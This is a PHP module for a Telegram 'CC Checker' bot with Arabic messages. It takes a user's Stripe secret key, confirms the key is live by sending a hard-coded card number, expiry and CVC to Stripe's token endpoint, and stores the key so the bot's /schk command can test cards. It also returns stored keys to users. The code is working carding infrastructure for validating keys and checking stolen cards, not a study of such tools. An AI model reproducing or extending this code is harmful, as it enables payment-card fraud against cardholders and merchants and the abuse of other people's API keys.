<?php

/*

///==[API Key for CC Checker Commands]==///

/apikey sk_live_xxx - Sets the SK Key
/myapikey - Returns your  API Key

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[API KEY]====////////////
if(strpos($message, "/apikey ") === 0 || strpos($message, "!apikey ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>مكافحة البريد المزعج</u>] حاول مرة أخرى بعد <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"<b>انتظر النتيجة...</b>",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $sk = substr($message, 7);
        
        if(preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $sk, $matches)) {
            $sk = $matches[0][0];

            if(fetchAPIKey($userId) == $sk){
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>مفتاح SK هذا هو نفسه مفتاح SK الموجود لديك!</b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'
                    
                ]);
                return;
            }

            ###CHECKER PART###  
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            $headers = array();
            $headers[] = 'Content-Type: application/x-www-form-urlencoded';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            $result = curl_exec($ch);

            file_put_contents('as.txt',$result);
            if(strpos($result, 'error') == False || stripos($result, '"type": "card_error"')){
                updateAPIKey($userId,$sk);

                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>✅ تمت إضافة مفتاح API الخاص بك بنجاح!
يمكنك الآن التحقق من البطاقات باستخدام /schk</b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'
                    
                ]);
                
                if($chattype != 'private'){
                bot('deleteMessage',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$message_id]);
                }


            }elseif(stripos($result, 'error')){
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>مفتاح SK هذا ميت! زودني بـ Live SK Key</b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'
                    
                ]);
            }
        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>بارد! سخيف توفر مفتاح SK!</b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
        }
    }
}

////////////====[MY API KEY]====////////////
if(strpos($message, "/myapikey") === 0 || strpos($message, "!myapikey") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>مكافحة البريد المزعج</u>] حاول مرة أخرى بعد حاول مرة أخرى بعد <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $apikey = fetchAPIKey($userId);

        if($chattype != 'private'){
            $apikey = substr_replace($apikey, '',12).preg_replace("/(?!^).(?!$)/", "*", substr($apikey, 12));
            $secmessage = "<b>استخدم الأمر في PM للحصول على مفتاح SK الكامل الخاص بك.</b>";
        }
        
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"<b>مفتاح API الخاص بك:- <code>$apikey</code></b>

$secmessage        ",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id]);

        

    }
}


?>